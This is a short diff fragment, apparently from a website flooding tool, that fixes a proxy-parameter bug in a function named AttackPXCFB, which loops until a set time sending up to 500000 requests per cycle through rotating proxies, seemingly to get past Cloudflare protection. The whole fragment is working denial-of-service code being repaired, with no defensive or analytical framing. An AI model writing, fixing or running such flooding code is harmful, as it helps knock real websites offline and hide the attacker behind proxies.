@@ -543,12 +543,12 @@ def AttackCFB(url, until_datetime, scraper):
 
 
 
-def AttackPXCFB(url, until_datetime, scraper,proxies,th):
+def AttackPXCFB(url, until_datetime, scraper,proxy,th):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
 
             for _ in range(500000):
-                if proxies:
+                if proxy:
                     proxy_url = f"http://{proxy[0]}:{proxy[1]}"
                     print(proxy_url+'----proxy-url')
                     proxies = {
